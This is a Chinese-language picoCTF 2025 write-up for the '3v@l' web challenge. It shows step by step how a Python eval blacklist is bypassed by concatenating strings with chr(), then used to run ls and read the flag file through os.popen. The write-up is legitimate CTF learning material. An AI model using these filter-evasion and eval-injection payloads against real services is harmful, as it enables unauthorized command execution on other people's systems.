##### tags:`picoCTF_2025`

# picoCTF Web : 3v@l

<style>
.red {
  color: red;
}
.blue {
  color: blue;
}
.purple {
  color: #7D3382;
}
.light_purple {
  color: #810cf5;
}
</style>

## <span class="red">**題目**</span>

- ![image](https://hackmd.io/_uploads/BkLEHDV21l.png)
- ![image](https://hackmd.io/_uploads/B16qHP4h1e.png)

## <span class="red">**解題過程**</span>

1. **進到網頁後，先打開 DevTools 看看網頁有沒有甚麼線索。會發現有 html 的註解說明我黑名單會擋掉哪些資訊**

- ![image](https://hackmd.io/_uploads/rJ4WUv4h1x.png)

&emsp;

2. **根據題目給的提示，看似沒有檔 ```__import__``` 這種 function 。那就先試試看 ```importlib.__import__("\157\163")```，這等價於 ```importlib.__import__("os")```**

- ![image](https://hackmd.io/_uploads/rJmciPE31l.png)

3. **在 Execute 後網頁跳出了 Error ，訊息說明有擋掉某個內容(應該是有擋掉八進位編碼)，所以這裡嘗試看看用字元拼接的方式，像是把 os 拆成 ```chr(111)+chr(115)``` ， Execute 後會發現錯誤訊息變成 ```importlib``` 未定義**

- ![image](https://hackmd.io/_uploads/ryewsv421l.png)
- ![image](https://hackmd.io/_uploads/Sy5YawE3Je.png)
- ![image](https://hackmd.io/_uploads/By0O6v431g.png)

&emsp;

4. **所以猜測應該是沒有函式庫，這時候改一下 ```importlib``` 的部份，直接使用 python 內建的 ```__import__``` 函式，
payload 改為 ```__import__(chr(111) + chr(115))```，
其中 ```(chr(111) + chr(115))``` 是 ```os``` 的 ASCII**

- ![image](https://hackmd.io/_uploads/rkAAJ_E3ke.png)
- ![image](https://hackmd.io/_uploads/BkdkluE3ke.png)

&emsp;

5. **看起來是沒問題的，那就可以把後續的 system 也加進去 payload 裡看看效果， payload 會變成 
```__import__(chr(111) + chr(115)).system(chr(108) + chr(115))```
而 ```chr(108) + chr(115)``` 就是 ```ls``` 的 ASCII**

- ![image](https://hackmd.io/_uploads/rJpI-_4nJe.png)
- ![image](https://hackmd.io/_uploads/HJoc-uV21e.png)

&emsp;

6. **結果是 0 ，代表執行成功，但是沒有輸出，所以這裡不要用 system (因為 ```os.system()``` 不會顯示輸出)，改為使用 popen.read()， payload 變為
```__import__(chr(111) + chr(115)).popen(chr(108) + chr(115)).read()```**

- ![image](https://hackmd.io/_uploads/S1d4NdEhJe.png)
- ![image](https://hackmd.io/_uploads/Hy2XVd43ye.png)

7. **當前目錄沒有有用的資訊，所以去根目錄看看，將 payload 改為
```__import__(chr(111) + chr(115)).popen(chr(108) + chr(115) + chr(32) + chr(47)).read()```
其中 ```chr(32)``` 和 ```chr(47)``` 分別是 ```空格``` 和 ```/```**

- ![image](https://hackmd.io/_uploads/Hki8NdVnJx.png)
- ![image](https://hackmd.io/_uploads/SJsDVuNh1l.png)

&emsp;

8. **成功發現 flag.txt ，這時再把 flag 改為 
```__import__(chr(111) + chr(115)).popen(chr(99) + chr(97) + chr(116) + chr(32) + chr(47) + chr(102) + chr(108) + chr(97) + chr(103)).read()```
其中 ```chr(99) + chr(97) + chr(116)``` 是 ```cat``` ， ```chr(47) + chr(102) + chr(108) + chr(97) + chr(103)``` 是 ```/flag```**

- ![image](https://hackmd.io/_uploads/SkqFHd4hkx.png)
- ![image](https://hackmd.io/_uploads/ryBcruE2yx.png)

&emsp;

9. **會發現沒有結果，所以應該跟前面的題目一樣存在權限問題，多加 sudo 試試看， payload 變為
```__import__(chr(111) + chr(115)).popen(chr(115) + chr(117) + chr(100) + chr(111) + chr(32) + chr(99) + chr(97) + chr(116) + chr(32) + chr(47) + chr(102) + chr(108) + chr(97) + chr(103)).read()```
其中 ```chr(115) + chr(117) + chr(100) + chr(111) = sudo```，
但還是沒有讀到 flag**

- ![image](https://hackmd.io/_uploads/S1gz9OEhkl.png)
- ![image](https://hackmd.io/_uploads/SyIb9_4h1l.png)

&emsp;

10. **經過一段時間思考我才發現我在檔名的部分寫錯了，題目的 flag 檔檔名是 flag.txt ，所以我在 cat 時應該把副檔名也加上(或是用 ```*``` 匹配所有 flag 開頭的檔案) ，所以這裡先將 payload 改為沒有 sudo 的版本試試看
```__import__(chr(111) + chr(115)).popen(chr(99) + chr(97) + chr(116) + chr(32) + chr(47) + chr(102) + chr(108) + chr(97) + chr(103) + chr(42)).read()```
其中 ```chr(42) = *```
最後成功獲得 flag 而不需要超級使用者 (sudo) 的權限**

- ![image](https://hackmd.io/_uploads/Bk-o9erhye.png)
- ![image](https://hackmd.io/_uploads/H1eSieB2yl.png)

&emsp;

## <span class="red">**心得**</span>

1. **在解完題目後我有個疑問，如果可以使用字元拼接的方式，那我能不能直接用字母拼起來呢?所以我嘗試了
```__import__('o' + 's').popen('l' + 's').read()```**
這段 payload 先試試看能不能顯示當前目錄的內容，答案是可以的

- ![image](https://hackmd.io/_uploads/HJKHngBnkl.png)

&emsp;

2. **也因此，我將最終 payload 改為
```__import__('o' + 's').popen('ca' + 't ' + chr(47) + 'flag*').read()```
這樣寫目的是把 ```cat``` 指令拆分開(且在字母 t 後方補上 ```cat /flag*``` 之間的空格)，以及題目有擋 ```/``` ，所以必須要用 chr(47) 躲掉檢查。試試看能不能獲得 flag ，最終結果是可以**

- ![image](https://hackmd.io/_uploads/HkUYaer2Jx.png)
- ![image](https://hackmd.io/_uploads/SJG5agrn1l.png)
